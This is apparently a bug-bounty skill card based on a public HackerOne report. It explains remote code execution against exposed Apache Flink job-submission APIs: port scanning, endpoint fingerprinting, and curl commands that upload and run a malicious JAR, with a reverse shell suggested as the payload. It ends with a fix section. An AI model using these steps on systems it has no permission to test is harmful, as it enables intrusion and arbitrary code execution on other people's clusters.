---
name: api-apache-flink-rce
description: RCE via exposed Apache Flink (jar/plan upload) API. Teaches exploiting exposed big-data processing dashboards (Flink/Spark/Hadoop/YARN) through their REST APIs to run arbitrary code.
sources: hackerone_public
report_count: 1
---

# Apache Flink RCE via REST API (jar/plan upload)

**Report**: Aiven — "Apache Flink RCE via GET jar/plan API Endpoint" (hackerone.com/reports/1418891, critical, $6,000).

## Why it matters (the new lesson)
Big-data frameworks (Flink, Spark, Hadoop, Zeppelin, Jupyter) expose REST APIs for job submission. If exposed without auth, uploading a crafted JAR and submitting it executes arbitrary code on the cluster — a direct, high-impact RCE that's easy to fingerprint and exploit.

## How it works
1. Fingerprint Flink: `/`, `/jars`, `/config`, `/overview` (default 8081).
2. Upload a malicious JAR: `POST /jars/upload` with the JAR.
3. Submit the job: `POST /jars/<jar-id>/run` with `entry-class` pointing to your payload.

## How to hunt for it
1. Scan for Flink/Spark/Hadoop/YARN/ZooKeeper ports (8081, 8088, 4040, 7077, 8032, 8888).
2. Check `/jars`, `/jars/upload`, `/jars/:id/run` and their auth.
3. Upload a JAR that runs `id`/reverse shell.

## Payloads (curl)
```
curl -X POST -H "Expect:" -F "jarfile=@evil.jar" http://target:8081/jars/upload
curl -X POST http://target:8081/jars/<id>/run?entry-class=Exploit
```

## Fix
Auth + network isolation for cluster UIs/APIs; never expose job-submission APIs to the internet; RBAC + audit.
